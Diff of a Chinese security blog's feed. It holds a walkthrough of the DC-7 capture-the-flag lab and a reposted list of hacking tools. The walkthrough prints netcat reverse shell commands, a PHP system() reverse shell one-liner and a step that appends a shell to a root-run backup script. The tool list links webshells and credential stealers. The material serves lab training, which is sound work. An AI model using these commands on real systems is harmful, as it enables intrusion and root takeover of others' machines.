-</blockquote>
-<p>一直没搞懂这个外盒啥意思，看了下别人的博客，原来在主页下左下角有个<code>@DC7USER</code>，twitter上提示</p>
-<p>了github地址，<code>https://github.com/Dc7User</code>,里面有一个<code>staffdb</code>,首先看下<code>config.php</code></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">	<span class="variable">$username</span> = <span class="string">&quot;dc7user&quot;</span>;</span><br><span class="line">	<span class="variable">$password</span> = <span class="string">&quot;MdR3xOgB7#dW&quot;</span>;</span><br><span class="line">	<span class="variable">$dbname</span> = <span class="string">&quot;Staff&quot;</span>;</span><br><span class="line">	<span class="variable">$conn</span> = mysqli_connect(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h3 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h3><p>可以得到一个数据库的账号密码，试了下无法登录网站</p>
-<p>看看这个账号密码能不能登录ssh</p>
-<p><code>dc7user</code> <code>MdR3xOgB7#dW</code>，成功登录</p>
-<blockquote>
-<p><strong>dc7user@dc-7:~$ sudo -l</strong><br>-bash: sudo: command not found</p>
-<p>** dc-7:~$ sudo **</p>
-<p>-bash: sudo: command not found<br>You have new mail in /var/mail/dc7user<br>** dc7user@dc-7:~$ cat /var/mail/dc7user ** .</p>
-<p>内容和下面mbox差不多</p>
-</blockquote>
-<br>
-
-<blockquote>
-<p>** dc7user@dc-7:<del>$ ls **<br>backups  mbox<br>** dc7user@dc-7:</del>$ cat mbox **</p>
-<p>发现了3个备份文件</p>
-<p>数据库文件</p>
-<p>/home/dc7user/backups/website.sql</p>
-<p>shell脚本文件 </p>
-<p>/opt/scripts/backups.sh</p>
-<p>网站备份文件</p>
-<p>/home/dc7user/backups/website.tar.gz</p>
-</blockquote>
-<br>
-
-<blockquote>
-<p>** dc7user@dc-7:~$ cat /opt/scripts/backups.sh  **</p>
-<p>#!/bin/bash<br>rm /home/dc7user/backups/*<br>cd /var/www/html/<br>drush sql-dump –result-file=/home/dc7user/backups/website.sql<br>cd ..<br>tar -czf /home/dc7user/backups/website.tar.gz html/<br>gpg –pinentry-mode loopback –passphrase PickYourOwnPassword –symmetric /home/dc7user/backups/website.sql<br>gpg –pinentry-mode loopback –passphrase PickYourOwnPassword –symmetric /home/dc7user/backups/website.tar.gz<br>chown dc7user:dc7user /home/dc7user/backups/*<br>rm /home/dc7user/backups/website.sql<br>rm /home/dc7user/backups/website.tar.gz<br>dc7user@dc-7:~ $<br>** dc7user@dc-7:~$ ls -l /opt/scripts/backups.sh **</p>
-<p>-rwxrwxr-x 1 root www-data 520 Aug 29  2019 /opt/scripts/backups.sh</p>
-</blockquote>
-<p>bash脚本中有用到<code>drush</code>和<code>gpg</code>命令，查查用法</p>
-<p>可以使用<code>gpg</code>和<code>drush</code>命令</p>
-<h3 id="使用drush修改管理员密码"><a href="#使用drush修改管理员密码" class="headerlink" title="使用drush修改管理员密码"></a>使用drush修改管理员密码</h3><p>drush可以修改用户密码</p>
-<blockquote>
-<p>Drush是Drupal的命令行shell和Unix脚本接口。Drush Core附带了许多有用的命令，可用于与模块/主题/配置文件等代码进行交互。</p>
-</blockquote>
-<p><code>drush user-password admin --password=&quot;123&quot;</code></p>
-<blockquote>
-<p>dc7user@dc-7:~ $ drush user-password admin –password=”123”<br>Command user-password needs a higher bootstrap level to run - you will need to invoke drush from a more functional Drupal environment to run this command.                                                                      [error]<br>The drush command ‘user-password admin’ could not be executed.                                                                                                                                                                  [error]<br>dc7user@dc-7:~$ </p>
-</blockquote>
-<p>执行失败，进入/var/www/html目录试试</p>
-<blockquote>
-<p>dc7user@dc-7:/var/www/html$ drush user-password admin –password=”123”<br>Changed password for admin                                                                                                                                                                                                      [success]<br>dc7user@dc-7:/var/www/html$ </p>
-</blockquote>
-<p>修改密码成功，试试能不能登录网站<code>http://192.168.18.140/user/login</code></p>
-<p><code>admin</code>,<code>123</code>成功登录</p>
-<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>想办法反弹shell，看看能不能上传一句话木马连接</p>
-<p>新建文件发现类型没有php</p>
-<p><img src="/posts/9488740e/nophp.png"></p>
-<p>看看<code>Extend</code>插件扩展能不能安装php,没找到，需要手动安装，看了下别人的wp</p>
-<p>下载php filter模块</p>
-<blockquote>
-<p><a href="https://www.drupal.org/project/php">https://www.drupal.org/project/php</a></p>
-</blockquote>
-<p><img src="/posts/9488740e/phpinstallerror.png"></p>
-<p>提示安装格式应该为<code>zip tar tgz gz bz2</code></p>
-<p>下载tar.gz 保存到本地然后上传</p>
-<p><img src="/posts/9488740e/phpinstall1.png"></p>
-<p><img src="/posts/9488740e/phpinstall2.png"></p>
-<p><img src="/posts/9488740e/phpinstall3.png"></p>
-<p><img src="/posts/9488740e/phpinstall4.png"></p>
-<p>安装成功</p>
-<p>写个phpinfo()试试能不能成功</p>
-<p><img src="/posts/9488740e/phpinfo1.png"></p>
-<p><img src="/posts/9488740e/phpinfo2.png"></p>
-<h4 id="写一句话"><a href="#写一句话" class="headerlink" title="写一句话"></a>写一句话</h4><p><img src="/posts/9488740e/yijuhua.png"></p>
-<h4 id="连接蚁剑"><a href="#连接蚁剑" class="headerlink" title="连接蚁剑"></a>连接蚁剑</h4><p><img src="/posts/9488740e/yijuhua_yijian.png"></p>
-<br>
-
-<h4 id="nc反弹shell"><a href="#nc反弹shell" class="headerlink" title="nc反弹shell"></a>nc反弹shell</h4><blockquote>
-<p>kali <code>nc -nlvp 8888</code></p>
-<p>蚁剑 <code>nc -c /bin/sh 192.168.18.131 8888</code></p>
-</blockquote>
-<p><img src="/posts/9488740e/shell.png"></p>
-<p>反弹交互shell</p>
-<p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
-<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>将反弹shell的脚本写入到<code>/opt/scripts/backups.sh</code></p>
-<p><code>echo &quot;nc -e /bin/bash 192.168.18.131 7777&quot; &gt;&gt; /opt/scripts/backups.sh</code></p>
-<p>成功反弹到root的shell ，不过需要多等一会才行</p>
-<p><img src="/posts/9488740e/rootshell.png"></p>
-<p><img src="/posts/9488740e/flag.png"></p>
-<blockquote>
-<p>注:其实可以在写一句话的时候可以直接写反弹shell<br><code>&lt;?php system(&#39;nc -e /bin/sh 192.168.18.131 9999&#39;); ?&gt;</code><br><img src="/posts/9488740e/ncshell.png"></p>
-</blockquote>
 ]]></content>
       <categories>
         <category>DCchallenges</category>
@@ -898,6 +770,134 @@
       </tags>
   </entry>
   <entry>
+    <title>DCchallenges7</title>
+    <url>/posts/9488740e/</url>
+    <content><![CDATA[<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><blockquote>
+<p>网段        192.168.18.0/24</p>
+<p>kali        192.168.18.131</p>
+<p>靶机        192.168.18.140</p>
+</blockquote>
+<h4 id="扫描网段"><a href="#扫描网段" class="headerlink" title="扫描网段"></a>扫描网段</h4><blockquote>
+<p> kali@kali2020:~$ sudo nmap 192.168.18.0/24 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-07 14:16 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00045s latency).<br>Not shown: 65534 closed ports<br>PORT   STATE SERVICE VERSION<br>53/tcp open  domain  dnsmasq 2.78<br>MAC Address: 00:50:56:E0:DA:9A (VMware)</p>
+<p>Nmap scan report for 192.168.18.140<br>Host is up (0.00055s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br>80/tcp open  http    Apache httpd 2.4.25 ((Debian))<br>MAC Address: 00:0C:29:7C:A6:2A (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
+<p>Nmap scan report for 192.168.18.254<br>Host is up (0.00025s latency).<br>All 65535 scanned ports on 192.168.18.254 are filtered<br>MAC Address: 00:50:56:E1:37:77 (VMware)</p>
+<p>Nmap scan report for 192.168.18.131<br>Host is up (0.0000030s latency).<br>All 65535 scanned ports on 192.168.18.131 are closed</p>
+<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 64.63 seconds</p>
+</blockquote>
+<h4 id="扫描靶机"><a href="#扫描靶机" class="headerlink" title="扫描靶机"></a>扫描靶机</h4><blockquote>
+<p> kali@kali2020:~$ sudo nmap 192.168.18.140 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-07 21:11 CST<br>Nmap scan report for 192.168.18.140<br>Host is up (0.0017s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br>80/tcp open  http    Apache httpd 2.4.25 ((Debian))<br>MAC Address: 00:0C:29:7C:A6:2A (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
+<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 8.94 seconds</p>
+</blockquote>
+<h4 id="dirsearch扫目录"><a href="#dirsearch扫目录" class="headerlink" title="dirsearch扫目录"></a>dirsearch扫目录</h4><blockquote>
+<p> <a href="http://192.168.18.140/user/login">http://192.168.18.140/user/login</a></p>
+</blockquote>
+<br>
+
+<p>进入主页看到时使用的<code>Drupa</code>，之前的dc-1也是使用的这个</p>
+<h4 id="根据提示找线索"><a href="#根据提示找线索" class="headerlink" title="根据提示找线索"></a>根据提示找线索</h4><blockquote>
+<p>Welcome to DC-7</p>
+<p>DC-7 introduces some “new” concepts, but I’ll leave you to figure out what they are.  :-)</p>
+<p>While this challenge isn’t all that technical, if you need to resort to brute forcing or a dictionary attacks, you probably won’t succeed.</p>
+<p>What you will have to do, is to think “outside” the box.</p>
+<p>Way “outside” the box.  :-)</p>
+</blockquote>
+<blockquote>
+<p>dc-7引入了一些“新”概念，但我还是让你们自己来弄清楚它们是什么。—-)<br>虽然这个挑战并不完全是技术性的，但如果你需要诉诸粗暴的强迫或字典攻击，你可能不会成功。<br>你要做的是，想“外面”的盒子。<br>“外面”的盒子。—-)</p>
+</blockquote>
+<p>一直没搞懂这个外盒啥意思，看了下别人的博客，原来在主页下左下角有个<code>@DC7USER</code>，twitter上提示</p>
+<p>了github地址，<code>https://github.com/Dc7User</code>,里面有一个<code>staffdb</code>,首先看下<code>config.php</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">	<span class="variable">$username</span> = <span class="string">&quot;dc7user&quot;</span>;</span><br><span class="line">	<span class="variable">$password</span> = <span class="string">&quot;MdR3xOgB7#dW&quot;</span>;</span><br><span class="line">	<span class="variable">$dbname</span> = <span class="string">&quot;Staff&quot;</span>;</span><br><span class="line">	<span class="variable">$conn</span> = mysqli_connect(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h3><p>可以得到一个数据库的账号密码，试了下无法登录网站</p>
+<p>看看这个账号密码能不能登录ssh</p>
+<p><code>dc7user</code> <code>MdR3xOgB7#dW</code>，成功登录</p>
+<blockquote>
+<p><strong>dc7user@dc-7:~$ sudo -l</strong><br>-bash: sudo: command not found</p>
+<p>** dc-7:~$ sudo **</p>
+<p>-bash: sudo: command not found<br>You have new mail in /var/mail/dc7user<br>** dc7user@dc-7:~$ cat /var/mail/dc7user ** .</p>
+<p>内容和下面mbox差不多</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p>** dc7user@dc-7:<del>$ ls **<br>backups  mbox<br>** dc7user@dc-7:</del>$ cat mbox **</p>
+<p>发现了3个备份文件</p>
+<p>数据库文件</p>
+<p>/home/dc7user/backups/website.sql</p>
+<p>shell脚本文件 </p>
+<p>/opt/scripts/backups.sh</p>
+<p>网站备份文件</p>
+<p>/home/dc7user/backups/website.tar.gz</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p>** dc7user@dc-7:~$ cat /opt/scripts/backups.sh  **</p>
+<p>#!/bin/bash<br>rm /home/dc7user/backups/*<br>cd /var/www/html/<br>drush sql-dump –result-file=/home/dc7user/backups/website.sql<br>cd ..<br>tar -czf /home/dc7user/backups/website.tar.gz html/<br>gpg –pinentry-mode loopback –passphrase PickYourOwnPassword –symmetric /home/dc7user/backups/website.sql<br>gpg –pinentry-mode loopback –passphrase PickYourOwnPassword –symmetric /home/dc7user/backups/website.tar.gz<br>chown dc7user:dc7user /home/dc7user/backups/*<br>rm /home/dc7user/backups/website.sql<br>rm /home/dc7user/backups/website.tar.gz<br>dc7user@dc-7:~ $<br>** dc7user@dc-7:~$ ls -l /opt/scripts/backups.sh **</p>
+<p>-rwxrwxr-x 1 root www-data 520 Aug 29  2019 /opt/scripts/backups.sh</p>
+</blockquote>
+<p>bash脚本中有用到<code>drush</code>和<code>gpg</code>命令，查查用法</p>
+<p>可以使用<code>gpg</code>和<code>drush</code>命令</p>
+<h3 id="使用drush修改管理员密码"><a href="#使用drush修改管理员密码" class="headerlink" title="使用drush修改管理员密码"></a>使用drush修改管理员密码</h3><p>drush可以修改用户密码</p>
+<blockquote>
+<p>Drush是Drupal的命令行shell和Unix脚本接口。Drush Core附带了许多有用的命令，可用于与模块/主题/配置文件等代码进行交互。</p>
+</blockquote>
+<p><code>drush user-password admin --password=&quot;123&quot;</code></p>
+<blockquote>
+<p>dc7user@dc-7:~ $ drush user-password admin –password=”123”<br>Command user-password needs a higher bootstrap level to run - you will need to invoke drush from a more functional Drupal environment to run this command.                                                                      [error]<br>The drush command ‘user-password admin’ could not be executed.                                                                                                                                                                  [error]<br>dc7user@dc-7:~$ </p>
+</blockquote>
+<p>执行失败，进入/var/www/html目录试试</p>
+<blockquote>
+<p>dc7user@dc-7:/var/www/html$ drush user-password admin –password=”123”<br>Changed password for admin                                                                                                                                                                                                      [success]<br>dc7user@dc-7:/var/www/html$ </p>
+</blockquote>
+<p>修改密码成功，试试能不能登录网站<code>http://192.168.18.140/user/login</code></p>
+<p><code>admin</code>,<code>123</code>成功登录</p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>想办法反弹shell，看看能不能上传一句话木马连接</p>
+<p>新建文件发现类型没有php</p>
+<p><img src="/posts/9488740e/nophp.png"></p>
+<p>看看<code>Extend</code>插件扩展能不能安装php,没找到，需要手动安装，看了下别人的wp</p>
+<p>下载php filter模块</p>
+<blockquote>
+<p><a href="https://www.drupal.org/project/php">https://www.drupal.org/project/php</a></p>
+</blockquote>
+<p><img src="/posts/9488740e/phpinstallerror.png"></p>
+<p>提示安装格式应该为<code>zip tar tgz gz bz2</code></p>
+<p>下载tar.gz 保存到本地然后上传</p>
+<p><img src="/posts/9488740e/phpinstall1.png"></p>
+<p><img src="/posts/9488740e/phpinstall2.png"></p>
+<p><img src="/posts/9488740e/phpinstall3.png"></p>
+<p><img src="/posts/9488740e/phpinstall4.png"></p>
+<p>安装成功</p>
+<p>写个phpinfo()试试能不能成功</p>
+<p><img src="/posts/9488740e/phpinfo1.png"></p>
+<p><img src="/posts/9488740e/phpinfo2.png"></p>
+<h4 id="写一句话"><a href="#写一句话" class="headerlink" title="写一句话"></a>写一句话</h4><p><img src="/posts/9488740e/yijuhua.png"></p>
+<h4 id="连接蚁剑"><a href="#连接蚁剑" class="headerlink" title="连接蚁剑"></a>连接蚁剑</h4><p><img src="/posts/9488740e/yijuhua_yijian.png"></p>
+<br>
+
+<h4 id="nc反弹shell"><a href="#nc反弹shell" class="headerlink" title="nc反弹shell"></a>nc反弹shell</h4><blockquote>
+<p>kali <code>nc -nlvp 8888</code></p>
+<p>蚁剑 <code>nc -c /bin/sh 192.168.18.131 8888</code></p>
+</blockquote>
+<p><img src="/posts/9488740e/shell.png"></p>
+<p>反弹交互shell</p>
+<p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>将反弹shell的脚本写入到<code>/opt/scripts/backups.sh</code></p>
+<p><code>echo &quot;nc -e /bin/bash 192.168.18.131 7777&quot; &gt;&gt; /opt/scripts/backups.sh</code></p>
+<p>成功反弹到root的shell ，不过需要多等一会才行</p>
+<p><img src="/posts/9488740e/rootshell.png"></p>
+<p><img src="/posts/9488740e/flag.png"></p>
+<blockquote>
+<p>注:其实可以在写一句话的时候可以直接写反弹shell<br><code>&lt;?php system(&#39;nc -e /bin/sh 192.168.18.131 9999&#39;); ?&gt;</code><br><img src="/posts/9488740e/ncshell.png"></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>DCchallenges</category>
+      </categories>
+      <tags>
+        <tag>DCchallenges</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>DCchallenges8</title>
     <url>/posts/437699f/</url>
     <content><![CDATA[<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><blockquote>
@@ -995,6 +995,24 @@
       </categories>
       <tags>
         <tag>DCchallenges</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hacker_Tools-转</title>
+    <url>/posts/ec585c99/</url>
+    <content><![CDATA[<h1 id="Hacker-Tools"><a href="#Hacker-Tools" class="headerlink" title="Hacker_Tools"></a>Hacker_Tools</h1><p>来源：<a href="https://github.com/deliciousYSH/Hacker_Tools">https://github.com/deliciousYSH/Hacker_Tools</a></p>
+<h1 id="扫描器"><a href="#扫描器" class="headerlink" title="扫描器"></a>扫描器</h1><p>Nmap端口扫描器：<br><a href="https://github.com/nmap/nmap">https://github.com/nmap/nmap</a><br>被动式注入检测工具： <a href="https://github.com/sea-god/GourdScan">https://github.com/sea-god/GourdScan</a><br>高质量扫描Linux / FreeBSD Server中的任何漏洞：<br><a href="https://github.com/future-architect/vuls">https://github.com/future-architect/vuls</a><br>子域名扫描器：<br>Altdns-通过变更和排列发现子域：<a href="https://github.com/infosec-au/altdns">https://github.com/infosec-au/altdns</a><br>SubBrute使用开放式解析器作为一种代理来规避DNS速率限制：<a href="https://github.com/TheRook/subbrute">https://github.com/TheRook/subbrute</a><br>subDomainsBrute 1.2一个针对渗透测试者的快速子域暴力工具：<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a><br>Sublist3r:<a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a><br>本地网络扫描器（打开网页时扫描本地网络的PoC Javascript）：<br><a href="https://github.com/SkyLined/LocalNetworkScanner">https://github.com/SkyLined/LocalNetworkScanner</a><br>HellRaiser基于端口扫描以及关联CVE:<br><a href="https://github.com/m0nad/HellRaiser">https://github.com/m0nad/HellRaiser</a><br>Routeh-页面上的漏洞路由器：<br><a href="https://github.com/jh00nbr/Routeh">https://github.com/jh00nbr/Routeh</a><br>防火墙检测工具：<br><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a><br>漏洞扫描程序，以最少的规则集在短时间内扫描大量目标：<br><a href="https://github.com/lijiejie/BBScan">https://github.com/lijiejie/BBScan</a><br>基于SQLMAP的主动和被动SQL注入的漏洞扫描工具： <a href="https://github.com/fengxuangit/Fox-scan/">https://github.com/fengxuangit/Fox-scan/</a></p>
+<h1 id="信息搜集工具"><a href="#信息搜集工具" class="headerlink" title="信息搜集工具"></a>信息搜集工具</h1><p>社工收集工具：<br><a href="https://github.com/n0tr00t/Sreg">https://github.com/n0tr00t/Sreg</a><br>信息扫描工具：<br><a href="https://github.com/darryllane/Bluto">https://github.com/darryllane/Bluto</a><br>本地网络扫描仪：<br><a href="https://github.com/sowish/LNScan">https://github.com/sowish/LNScan</a><br>通过RDP扫描可访问性工具后门：<br><a href="https://github.com/linuz/Sticky-Keys-Slayer">https://github.com/linuz/Sticky-Keys-Slayer</a><br>网络基础设施渗透测试工具：<br><a href="https://github.com/SECFORCE/sparta">https://github.com/SECFORCE/sparta</a><br>GitHub信息收集：<br><a href="https://github.com/metac0rtex/GitHarvester">https://github.com/metac0rtex/GitHarvester</a></p>
+<h1 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h1><p>密码破解工具（开膛手Johnny）:<br><a href="https://github.com/shinnok/johnny">https://github.com/shinnok/johnny</a><br>获取存储在本地计算机上大量的密码：<br><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a><br>SNMP暴力破解：<br><a href="https://github.com/SECFORCE/SNMP-Brute">https://github.com/SECFORCE/SNMP-Brute</a></p>
+<h1 id="Web渗透（禁止用作违法）"><a href="#Web渗透（禁止用作违法）" class="headerlink" title="Web渗透（禁止用作违法）"></a>Web渗透（禁止用作违法）</h1><p>HTTP暴力破解，撞库攻击脚本：<br><a href="https://github.com/lijiejie/htpwdScan">https://github.com/lijiejie/htpwdScan</a><br>webshell：<br><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a><br>免杀webshell无限生成工具：<br><a href="https://github.com/yzddmr6/webshell-venom">https://github.com/yzddmr6/webshell-venom</a><br>渗透工具合集：<br><a href="https://github.com/rootphantomer/hack_tools_for_me">https://github.com/rootphantomer/hack_tools_for_me</a><br>XSSOR-方便XSS与CSRF的工具：<br><a href="https://github.com/evilcos/xssor2">https://github.com/evilcos/xssor2</a><br>w3af-Web应用程序攻击和审核框架：<br><a href="https://github.com/andresriancho/w3af">https://github.com/andresriancho/w3af</a><br>渗透测试包：<br><a href="https://github.com/leonteale/pentestpackage">https://github.com/leonteale/pentestpackage</a><br>网络路径扫描仪：<br><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a><br>代码注入检测工具： <a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a> hackUtils：<br><a href="https://github.com/brianwrf/hackUtils">https://github.com/brianwrf/hackUtils</a><br>Nikto Web服务器扫描仪：<br><a href="https://github.com/sullo/nikto">https://github.com/sullo/nikto</a><br>自动化的多合一OS命令注入和利用工具：<br><a href="https://github.com/commixproject/commix">https://github.com/commixproject/commix</a><br>sslscan测试：<br><a href="https://github.com/rbsec/sslscan">https://github.com/rbsec/sslscan</a><br>Windows安全工具套件：<br><a href="https://github.com/codejanus/ToolSuite">https://github.com/codejanus/ToolSuite</a><br>Apache实时日志分析器系统：<br><a href="https://github.com/mthbernardes/ARTLAS">https://github.com/mthbernardes/ARTLAS</a><br>检测网络入侵的特征，恶意蜘蛛（Malspider）：<br><a href="https://github.com/ciscocsirt/malspider">https://github.com/ciscocsirt/malspider</a><br>下一代网络扫描仪WhatWeb：<br><a href="https://github.com/urbanadventurer/whatweb">https://github.com/urbanadventurer/whatweb</a><br>WPScan，WordPress漏洞扫描程序：<br><a href="https://github.com/wpscanteam/wpscan">https://github.com/wpscanteam/wpscan</a><br>【sqlmap】:<br><a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a><br>SQLi-Hunter(HTTP代理服务器和一个SQLMAP API包装器):<br><a href="https://github.com/zt2/sqli-hunter">https://github.com/zt2/sqli-hunter</a><br>中国菜刀：<br><a href="https://github.com/Chora10/Cknife">https://github.com/Chora10/Cknife</a></p>
+<h1 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h1><p>Web应用程序模糊器：<br><a href="https://github.com/xmendez/wfuzz">https://github.com/xmendez/wfuzz</a></p>
+<h1 id="漏洞及渗透练习平台"><a href="#漏洞及渗透练习平台" class="headerlink" title="漏洞及渗透练习平台"></a>漏洞及渗透练习平台</h1><p>WebGoat漏洞练习平台：<br><a href="https://webgoat.github.io/WebGoat/">https://webgoat.github.io/WebGoat/</a><br>dvwa漏洞练习平台：<br><a href="https://github.com/ethicalhack3r/DVWA">https://github.com/ethicalhack3r/DVWA</a><br>数据库注入练习平台 ：<br><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a><br>like OWASP Node Goat：<br><a href="https://github.com/cr0hn/vulnerable-node">https://github.com/cr0hn/vulnerable-node</a><br>Ruby编写的一款工具，安全方案生成器（SecGen）：<br><a href="https://github.com/cliffe/secgen">https://github.com/cliffe/secgen</a><br>VulApps漏洞练习平台：<br><a href="https://github.com/Medicean/VulApps">https://github.com/Medicean/VulApps</a><br>ZVuldrill Web突破演练平台：<br><a href="https://github.com/710leo/ZVulDrill">https://github.com/710leo/ZVulDrill</a><br>WebGoat旧版：<br><a href="https://github.com/WebGoat/WebGoat-Legacy">https://github.com/WebGoat/WebGoat-Legacy</a></p>
+]]></content>
+      <categories>
+        <category>工具手册</category>
+      </categories>
+      <tags>
+        <tag>工具手册</tag>
       </tags>
   </entry>
   <entry>
@@ -1128,36 +1146,6 @@
       </categories>
       <tags>
         <tag>DCchallenges</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hacker_Tools-转</title>
-    <url>/posts/ec585c99/</url>
-    <content><![CDATA[<h1 id="Hacker-Tools"><a href="#Hacker-Tools" class="headerlink" title="Hacker_Tools"></a>Hacker_Tools</h1><p>来源：<a href="https://github.com/deliciousYSH/Hacker_Tools">https://github.com/deliciousYSH/Hacker_Tools</a></p>
-<h1 id="扫描器"><a href="#扫描器" class="headerlink" title="扫描器"></a>扫描器</h1><p>Nmap端口扫描器：<br><a href="https://github.com/nmap/nmap">https://github.com/nmap/nmap</a><br>被动式注入检测工具： <a href="https://github.com/sea-god/GourdScan">https://github.com/sea-god/GourdScan</a><br>高质量扫描Linux / FreeBSD Server中的任何漏洞：<br><a href="https://github.com/future-architect/vuls">https://github.com/future-architect/vuls</a><br>子域名扫描器：<br>Altdns-通过变更和排列发现子域：<a href="https://github.com/infosec-au/altdns">https://github.com/infosec-au/altdns</a><br>SubBrute使用开放式解析器作为一种代理来规避DNS速率限制：<a href="https://github.com/TheRook/subbrute">https://github.com/TheRook/subbrute</a><br>subDomainsBrute 1.2一个针对渗透测试者的快速子域暴力工具：<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a><br>Sublist3r:<a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a><br>本地网络扫描器（打开网页时扫描本地网络的PoC Javascript）：<br><a href="https://github.com/SkyLined/LocalNetworkScanner">https://github.com/SkyLined/LocalNetworkScanner</a><br>HellRaiser基于端口扫描以及关联CVE:<br><a href="https://github.com/m0nad/HellRaiser">https://github.com/m0nad/HellRaiser</a><br>Routeh-页面上的漏洞路由器：<br><a href="https://github.com/jh00nbr/Routeh">https://github.com/jh00nbr/Routeh</a><br>防火墙检测工具：<br><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a><br>漏洞扫描程序，以最少的规则集在短时间内扫描大量目标：<br><a href="https://github.com/lijiejie/BBScan">https://github.com/lijiejie/BBScan</a><br>基于SQLMAP的主动和被动SQL注入的漏洞扫描工具： <a href="https://github.com/fengxuangit/Fox-scan/">https://github.com/fengxuangit/Fox-scan/</a></p>
-<h1 id="信息搜集工具"><a href="#信息搜集工具" class="headerlink" title="信息搜集工具"></a>信息搜集工具</h1><p>社工收集工具：<br><a href="https://github.com/n0tr00t/Sreg">https://github.com/n0tr00t/Sreg</a><br>信息扫描工具：<br><a href="https://github.com/darryllane/Bluto">https://github.com/darryllane/Bluto</a><br>本地网络扫描仪：<br><a href="https://github.com/sowish/LNScan">https://github.com/sowish/LNScan</a><br>通过RDP扫描可访问性工具后门：<br><a href="https://github.com/linuz/Sticky-Keys-Slayer">https://github.com/linuz/Sticky-Keys-Slayer</a><br>网络基础设施渗透测试工具：<br><a href="https://github.com/SECFORCE/sparta">https://github.com/SECFORCE/sparta</a><br>GitHub信息收集：<br><a href="https://github.com/metac0rtex/GitHarvester">https://github.com/metac0rtex/GitHarvester</a></p>
-<h1 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h1><p>密码破解工具（开膛手Johnny）:<br><a href="https://github.com/shinnok/johnny">https://github.com/shinnok/johnny</a><br>获取存储在本地计算机上大量的密码：<br><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a><br>SNMP暴力破解：<br><a href="https://github.com/SECFORCE/SNMP-Brute">https://github.com/SECFORCE/SNMP-Brute</a></p>
